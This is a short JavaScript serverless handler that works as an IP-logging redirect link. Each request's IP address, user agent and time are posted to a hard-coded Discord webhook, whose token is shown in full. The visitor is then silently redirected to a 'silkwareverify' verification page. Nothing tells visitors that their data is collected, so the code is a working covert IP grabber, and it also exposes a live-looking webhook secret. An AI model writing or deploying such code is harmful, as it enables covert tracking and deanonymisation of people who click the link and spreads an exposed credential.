export default async function handler(req, res) {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket?.remoteAddress || "Unknown";
    const userAgent = req.headers["user-agent"];
    const time = new Date().toISOString();

    const webhookUrl = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg";

    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🟢 Visitor logged:\n- IP: ${ip}\n- User-Agent: ${userAgent}\n- Time: ${time}`
      })
    });

    res.writeHead(302, { Location: "https://vaultcord.win/silkwareverify" });
    res.end();
  } catch (err) {
    console.error("Error:", err);
    res.status(500).send("Internal Server Error");
  }
}
